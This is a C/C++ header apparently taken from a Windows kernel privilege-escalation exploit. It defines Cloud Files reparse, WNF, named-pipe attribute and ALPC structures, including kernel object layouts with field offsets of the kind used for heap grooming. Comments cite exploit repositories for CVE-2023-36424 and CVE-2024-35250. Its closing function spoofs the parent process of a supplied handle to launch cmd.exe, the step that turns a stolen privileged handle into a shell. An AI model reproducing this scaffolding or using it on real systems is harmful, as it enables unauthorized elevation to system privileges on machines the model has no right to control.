#pragma comment(lib, "CldApi.lib") 
#pragma comment(lib,"kernel32.lib")

struct HSM_ELEMENT_INFO {
	USHORT Type;
	USHORT Length;
	ULONG Offset;
};

typedef struct _HSM_DATA
{
	ULONG  Magic;
	ULONG  Crc32;
	ULONG  Length;
	USHORT Flags;
	USHORT NumberOfElements;
	HSM_ELEMENT_INFO ElementInfos[5];
} HSM_DATA, * PHSM_DATA;

typedef struct _HSM_REPARSE_DATA
{
	USHORT Flags;
	USHORT Length;
	HSM_DATA FileData;
} HSM_REPARSE_DATA, * PHSM_REPARSE_DATA;

struct REPARSE_DATA_BUFFER {
	ULONG  ReparseTag;
	USHORT ReparseDataLength;
	USHORT Reserved;
	char   RpBuf[0x2000];
};

struct REPARSE_DATA_BUFFER_EX {
	ULONG     Flags;
	ULONG     ExistingReparseTag;
	GUID      ExistingReparseGuid;
	ULONGLONG Reserved;
	REPARSE_DATA_BUFFER ReparseDataBuffer;
};

typedef struct _WNF_STATE_NAME {
	ULONG Data[2];
} WNF_STATE_NAME, * PWNF_STATE_NAME;

typedef enum _WNF_STATE_NAME_LIFETIME {
	WnfWellKnownStateName = 0x0,
	WnfPermanentStateName = 0x1,
	WnfPersistentStateName = 0x2,
	WnfTemporaryStateName = 0x3
} WNF_STATE_NAME_LIFETIME;

typedef enum _WNF_DATA_SCOPE {
	WnfDataScopeSystem = 0x0,
	WnfDataScopeSession = 0x1,
	WnfDataScopeUser = 0x2,
	WnfDataScopeProcess = 0x3,
	WnfDataScopeMachine = 0x4
} WNF_DATA_SCOPE;

typedef struct _WNF_TYPE_ID {
	GUID                              TypeId;
} WNF_TYPE_ID, * PWNF_TYPE_ID;

typedef const WNF_TYPE_ID* PCWNF_TYPE_ID;
typedef ULONG LOGICAL;
typedef ULONG WNF_CHANGE_STAMP, * PWNF_CHANGE_STAMP;
typedef const struct _WNF_STATE_NAME* PCWNF_STATE_NAME;

typedef NTSTATUS(WINAPI* fNtFsControlFile)(
	HANDLE    FileHandle,
	HANDLE    Event,
	PVOID     ApcRoutine,
	PVOID     ApcContext,
	PVOID     IoStatusBlock,
	ULONG     FsControlCode,
	PVOID     InputBuffer,
	ULONG     InputBufferLength,
	PVOID     OutputBuffer,
	ULONG     OutputBufferLength
	);


typedef NTSTATUS(NTAPI* fNtCreateWnfStateName)(
	PWNF_STATE_NAME StateName,
	WNF_STATE_NAME_LIFETIME NameLifetime,
	WNF_DATA_SCOPE DataScope,
	BOOLEAN PersistData,
	PCWNF_TYPE_ID TypeId,
	ULONG MaximumStateSize,
	PSECURITY_DESCRIPTOR SecurityDescriptor
	);

typedef NTSTATUS(NTAPI* fNtUpdateWnfStateData)(
	PCWNF_STATE_NAME StateName,
	VOID* Buffer,
	ULONG Length,
	PCWNF_TYPE_ID TypeId,
	VOID* ExplicitScope,
	WNF_CHANGE_STAMP MatchingChangeStamp,
	LOGICAL CheckStamp
	);

typedef NTSTATUS(NTAPI* fNtDeleteWnfStateData)(
	PWNF_STATE_NAME StateName,
	VOID* ExplicitScope
	);

typedef NTSTATUS(NTAPI* fNtQueryWnfStateData)(
	PCWNF_STATE_NAME StateName,
	PCWNF_TYPE_ID TypeId,
	VOID* ExplicitScope,
	PWNF_CHANGE_STAMP ChangeStamp,
	PVOID Buffer,
	PULONG BufferSize
	);

typedef NTSTATUS(NTAPI* fNtDeleteWnfStateName)(
	PCWNF_STATE_NAME StateName
	);

// General struct definitions
typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID;

typedef struct _LSA_UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} LSA_UNICODE_STRING, * PLSA_UNICODE_STRING, UNICODE_STRING, * PUNICODE_STRING;

typedef struct _IO_STATUS_BLOCK {
	union {
		NTSTATUS Status;
		PVOID    Pointer;
	};
	ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

typedef struct _PipeAttribute
{
	LIST_ENTRY list;
	char* AttributeName;
	uint64_t AttributeValueSize;
	char* AttributeValue;
	char data[0];
} PipeAttribute, * PPipeAttribute;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

#define InitializeObjectAttributes(p, n, a, r, s) \
{ \
	(p)->Length = sizeof(OBJECT_ATTRIBUTES); \
	(p)->RootDirectory = r; \
	(p)->Attributes = a; \
	(p)->ObjectName = n; \
	(p)->SecurityDescriptor = s; \
	(p)->SecurityQualityOfService = NULL; \
}

// General function definitions
typedef NTSTATUS(__stdcall* fpRtlDecompressBuffer)(USHORT, PUCHAR, ULONG, PUCHAR, ULONG, PULONG);
typedef NTSTATUS(__stdcall* fpRtlCompressBuffer)(USHORT, PUCHAR, ULONG, PUCHAR, ULONG, ULONG, PULONG, PVOID);
typedef NTSTATUS(__stdcall* fpRtlGetCompressionWorkSpaceSize)(USHORT, PULONG, PULONG);

typedef NTSTATUS(NTAPI* fpNtFsControlFile)(
	IN HANDLE FileHandle,
	IN HANDLE Event OPTIONAL,
	IN PVOID ApcRoutine OPTIONAL,
	IN PVOID ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK IoStatusBlock,
	IN ULONG FsControlCode,
	IN PVOID InputBuffer OPTIONAL,
	IN ULONG InputBufferLength,
	OUT PVOID OutputBuffer OPTIONAL,
	IN ULONG OutputBufferLength
	);


typedef NTSTATUS(NTAPI* fpNtCreateWnfStateName)(
	_Out_ PWNF_STATE_NAME StateName,
	_In_ WNF_STATE_NAME_LIFETIME NameLifetime,
	_In_ WNF_DATA_SCOPE DataScope,
	_In_ BOOLEAN PersistData,
	_In_opt_ PCWNF_TYPE_ID TypeId,
	_In_ ULONG MaximumStateSize,
	_In_ PSECURITY_DESCRIPTOR SecurityDescriptor
	);

typedef ULONG WNF_CHANGE_STAMP, * PWNF_CHANGE_STAMP;

typedef NTSTATUS(NTAPI* fpNtUpdateWnfStateData)(
	_In_ PWNF_STATE_NAME StateName,
	_In_reads_bytes_opt_(Length) const VOID* Buffer,
	_In_opt_ ULONG Length,
	_In_opt_ PCWNF_TYPE_ID TypeId,
	_In_opt_ const PVOID ExplicitScope,
	_In_ WNF_CHANGE_STAMP MatchingChangeStamp,
	_In_ ULONG CheckStamp
	);

typedef NTSTATUS(NTAPI* fpNtQueryWnfStateData)(
	_In_ PWNF_STATE_NAME StateName,
	_In_opt_ PWNF_TYPE_ID TypeId,
	_In_opt_ const VOID* ExplicitScope,
	_Out_ PWNF_CHANGE_STAMP ChangeStamp,
	_Out_writes_bytes_to_opt_(*BufferSize, *BufferSize) PVOID Buffer,
	_Inout_ PULONG BufferSize
	);

typedef struct _WNF_STATE_NAME_REGISTRATION {
	PVOID64 MaxStateSize;
	PVOID64  TypeId;
	PVOID64 SecurityDescriptor;
} WNF_STATE_NAME_REGISTRATION, * PWNF_STATE_NAME_REGISTRATION;

typedef NTSTATUS(NTAPI* fpNtDeleteWnfStateData) (
	_In_ PWNF_STATE_NAME StateName,
	_In_opt_ const VOID* ExplicitScope
	);

typedef NTSTATUS(NTAPI* fpNtDeleteWnfStateName)(_In_ PWNF_STATE_NAME StateName);

// ALPC Stuff
// https://github.com/Nassim-Asrir/CVE-2023-36424
#define MAX_MSG_LEN 0x500
#define ALPC_MSGFLG_NONE 0x0

typedef struct _ALPC_PORT_ATTRIBUTES {
	unsigned long Flags;
	SECURITY_QUALITY_OF_SERVICE SecurityQos;
	unsigned __int64 MaxMessageLength;
	unsigned __int64 MemoryBandwidth;
	unsigned __int64 MaxPoolUsage;
	unsigned __int64 MaxSectionSize;
	unsigned __int64 MaxViewSize;
	unsigned __int64 MaxTotalSectionSize;
	ULONG DupObjectTypes;
#ifdef _WIN64
	ULONG Reserved;
#endif
} ALPC_PORT_ATTRIBUTES, * PALPC_PORT_ATTRIBUTES;

typedef struct _ALPC_MESSAGE_ATTRIBUTES {
	ULONG AllocatedAttributes;
	ULONG ValidAttributes;
} ALPC_MESSAGE_ATTRIBUTES, * PALPC_MESSAGE_ATTRIBUTES;

typedef struct _PORT_MESSAGE {
	union {
		struct {
			USHORT DataLength;
			USHORT TotalLength;
		} s1;
		ULONG Length;
	} u1;
	union {
		struct {
			USHORT Type;
			USHORT DataInfoOffset;
		} s2;
		ULONG ZeroInit;
	} u2;
	union {
		CLIENT_ID ClientId;
		double DoNotUseThisField;
	};
	ULONG MessageId;
	union {
		SIZE_T ClientViewSize; // only valid for LPC_CONNECTION_REQUEST messages
		ULONG CallbackId; // only valid for LPC_REQUEST messages
	};
} PORT_MESSAGE, * PPORT_MESSAGE;

typedef struct _ALPC_MESSAGE {
	PORT_MESSAGE PortHeader;
	BYTE PortMessage[1000]; // Hard limit for this is 65488. An Error is thrown if AlpcMaxAllowedMessageLength() is exceeded
} ALPC_MESSAGE, * PALPC_MESSAGE;

typedef struct _KALPC_MESSAGE {
	struct _LIST_ENTRY Entry;                                               //0x0
	struct _ALPC_PORT* PortQueue;                                           //0x10
	struct _ALPC_PORT* OwnerPort;                                           //0x18
	struct _ETHREAD* WaitingThread;                                         //0x20
	union {
		struct {
			ULONG QueueType : 3;                                              //0x28
			ULONG QueuePortType : 4;                                          //0x28
			ULONG Canceled : 1;                                               //0x28
			ULONG Ready : 1;                                                  //0x28
			ULONG ReleaseMessage : 1;                                         //0x28
			ULONG SharedQuota : 1;                                            //0x28
			ULONG ReplyWaitReply : 1;                                         //0x28
			ULONG OwnerPortReference : 1;                                     //0x28
			ULONG ReceiverReference : 1;                                      //0x28
			ULONG ViewAttributeRetrieved : 1;                                 //0x28
			ULONG ViewAttributeDeleteOnRelease : 1;                           //0x28
			ULONG InDispatch : 1;                                             //0x28
			ULONG InCanceledQueue : 1;                                        //0x28
		} s1;                                                               //0x28
		ULONG State;                                                        //0x28
	} u1;                                                                   //0x28
	LONG SequenceNo;                                                        //0x2c
	union {
		struct _EPROCESS* QuotaProcess;                                     //0x30
		VOID* QuotaBlock;                                                   //0x30
	};
	struct _ALPC_PORT* CancelSequencePort;                                  //0x38
	struct _ALPC_PORT* CancelQueuePort;                                     //0x40
	LONG CancelSequenceNo;                                                  //0x48
	struct _LIST_ENTRY CancelListEntry;                                     //0x50
	struct _KALPC_RESERVE* Reserve;                                         //0x60
	BYTE MessageAttributesStub[0x48];                                       //0x68
	VOID* DataUserVa;                                                       //0xb0
	struct _ALPC_COMMUNICATION_INFO* CommunicationInfo;                     //0xb8
	struct _ALPC_PORT* ConnectionPort;                                      //0xc0
	struct _ETHREAD* ServerThread;                                          //0xc8
	VOID* WakeReference;                                                    //0xd0
	VOID* WakeReference2;                                                   //0xd8
	VOID* ExtensionBuffer;                                                  //0xe0
	ULONGLONG ExtensionBufferSize;                                          //0xe8
	struct _PORT_MESSAGE PortMessage;                                       //0xf0
} KALPC_MESSAGE;

typedef struct _KALPC_RESERVE {
	struct _ALPC_PORT* OwnerPort;											//0x0
	struct _ALPC_HANDLE_TABLE* HandleTable;									//0x8
	VOID* Handle;															//0x10
	struct _KALPC_MESSAGE* Message;											//0x18
	ULONGLONG Size;															//0x20
	LONG Active;															//0x28
} KALPC_RESERVE;

typedef NTSTATUS(NTAPI* fpNtAlpcCreatePort)(
	_Out_ PHANDLE PortHandle,
	_In_ POBJECT_ATTRIBUTES ObjectAttributes,
	_In_opt_ PALPC_PORT_ATTRIBUTES PortAttributes
	);

typedef NTSTATUS(NTAPI* fpNtAlpcCreateResourceReserve)(
	_In_ HANDLE PortHandle,
	_Reserved_ ULONG Flags,
	_In_ SIZE_T MessageSize,
	_Out_ PHANDLE ResourceId
	);

typedef NTSTATUS(NTAPI* fpNtAlpcSendWaitReceivePort)(
	_In_ HANDLE  							PortHandle,
	_In_ ULONG  							Flags,
	_Inout_opt_ PPORT_MESSAGE  				SendMessage,
	_Inout_opt_ PALPC_MESSAGE_ATTRIBUTES  	SendMessageAttributes,
	_Inout_opt_ PPORT_MESSAGE               ReceiveMessage,
	_Inout_opt_ PSIZE_T  					BufferLength,
	_Inout_opt_ PALPC_MESSAGE_ATTRIBUTES  	ReceiveMessageAttributes,
	_In_opt_ PLARGE_INTEGER  				Timeout
	);


typedef NTSTATUS(NTAPI* fpNtAlpcCreatePort)(
	_Out_ PHANDLE PortHandle,
	_In_ POBJECT_ATTRIBUTES ObjectAttributes,
	_In_opt_ PALPC_PORT_ATTRIBUTES PortAttributes
	);

typedef NTSTATUS(NTAPI* fpNtAlpcCreateResourceReserve)(
	_In_ HANDLE PortHandle,
	_Reserved_ ULONG Flags,
	_In_ SIZE_T MessageSize,
	_Out_ PHANDLE ResourceId
	);

typedef NTSTATUS(NTAPI* fpNtAlpcSendWaitReceivePort)(
	_In_ HANDLE  							PortHandle,
	_In_ ULONG  							Flags,
	_Inout_opt_ PPORT_MESSAGE  				SendMessage,
	_Inout_opt_ PALPC_MESSAGE_ATTRIBUTES  	SendMessageAttributes,
	_Inout_opt_ PPORT_MESSAGE               ReceiveMessage,
	_Inout_opt_ PSIZE_T  					BufferLength,
	_Inout_opt_ PALPC_MESSAGE_ATTRIBUTES  	ReceiveMessageAttributes,
	_In_opt_ PLARGE_INTEGER  				Timeout
	);

SIZE_T StringLengthW(_In_ LPCWSTR String) {
	LPCWSTR String2;

	for (String2 = String; *String2; ++String2);

	return (String2 - String);
}

VOID RtlInitUnicodeString(_Inout_ PUNICODE_STRING DestinationString, _In_ PCWSTR SourceString) {
	SIZE_T DestSize;

	if (SourceString) {
		DestSize = StringLengthW(SourceString) * sizeof(WCHAR);
		DestinationString->Length = (USHORT)DestSize;
		DestinationString->MaximumLength = (USHORT)DestSize + sizeof(WCHAR);
	}
	else {
		DestinationString->Length = 0;
		DestinationString->MaximumLength = 0;
	}

	DestinationString->Buffer = (PWCHAR)SourceString;
}

// Source: https://github.com/varwara/CVE-2024-35250/blob/main/common.h#L305

void CreateProcessFromHandle(HANDLE hProcess) {

	int error;
	bool status;
	SIZE_T size = 0;
	LPVOID lpValue = nullptr;
	STARTUPINFOEX si;
	ZeroMemory(&si, sizeof(si));
	si.StartupInfo.cb = sizeof(si);
	si.lpAttributeList = nullptr;

	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(pi));

	// Initialize the thread attribute list
	do
	{
		status = InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
		error = GetLastError();

		if (!status)
		{
			if (si.lpAttributeList != nullptr)
				HeapFree(GetProcessHeap(), 0, si.lpAttributeList);

			si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
			ZeroMemory(si.lpAttributeList, size);
		}
	} while (!status && error == ERROR_INSUFFICIENT_BUFFER);

	// Update the thread attribute with the parent process handle
	do
	{
		if (!status)
		{
			std::cout << "[-] Failed to initialize thread attribute list.\n";
			std::cout << "    |-> " << error << "\n";
			break;
		}

		lpValue = HeapAlloc(GetProcessHeap(), 0, sizeof(HANDLE));
		memcpy_s(lpValue, sizeof(HANDLE), &hProcess, sizeof(HANDLE));

		status = UpdateProcThreadAttribute(
			si.lpAttributeList,
			0,
			PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
			lpValue,
			sizeof(HANDLE),
			nullptr,
			nullptr);

		if (!status)
		{
			error = GetLastError();
			std::cout << "[-] Failed to update thread attribute.\n";
			std::cout << "    |-> " << error << "\n";
			break;
		}

		// Create a new process using the specified command line
		status = CreateProcess(L"C:\\Windows\\System32\\cmd.exe", nullptr, nullptr, nullptr, false, EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, nullptr, nullptr, &si.StartupInfo, &pi);

		if (!status)
		{
			error = GetLastError();
			std::cout << "[-] Failed to create new process.\n";
			std::cout << "    |-> " << error << "\n";
		}
		else
		{
			std::cout << "[+] New process is created successfully.\n";
			std::cout << "    |-> PID : " << pi.dwProcessId << "\n";
			std::cout << "    |-> TID : " << pi.dwThreadId << "\n";
			CloseHandle(pi.hThread);
			CloseHandle(pi.hProcess);
		}
	} while (false);

	// Clean up allocated memory
	if (lpValue != nullptr)
		HeapFree(GetProcessHeap(), 0, lpValue);

	if (si.lpAttributeList != nullptr)
		HeapFree(GetProcessHeap(), 0, si.lpAttributeList);

	return;
}